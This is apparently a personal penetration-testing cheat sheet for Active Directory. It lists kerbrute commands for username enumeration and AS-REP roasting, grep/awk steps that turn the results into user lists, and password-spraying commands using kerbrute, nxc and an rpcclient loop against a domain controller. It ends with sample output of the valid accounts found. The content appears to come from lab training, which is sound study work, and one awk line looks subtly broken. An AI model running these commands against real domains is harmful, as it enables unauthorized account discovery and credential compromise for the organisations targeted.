
## Kerbrute Identifying users +ASREP Roast

asrep roast accounts with do not require kerberos pre authentication
```
kerbrute userenum --downgrade users.txt -o kerbrute.out
```
clean kerbrute output to a user list:
```
# create initial list with only the usernames
grep VALID kerbrute.out | awk '{print $7}'| awk -F\@ '{print $1}' > users.lst

#optional-domain\username list
grep VALID kerbrute.out | awk '{print $7}'| awk -F\@ '{print $2"\\"print $1}' > domain_users.lst
```
### KERBRUTE kerberos Spraying  (faster than nxc with smb) 
`kerbrute (seal of reliablity)`
```shell-session
kerbrute passwordspray -d ad.someorg.local --dc 172.16.5.5 users.lst  Welcome1 -o kerbrute.out
```


`nxc (slow)`
```shell-session
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```



`rpcclient`
```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```


After getting one (or more!) hits with our password spraying attack, we can then use `CrackMapExec` to validate the credentials quickly against a Domain Controller.


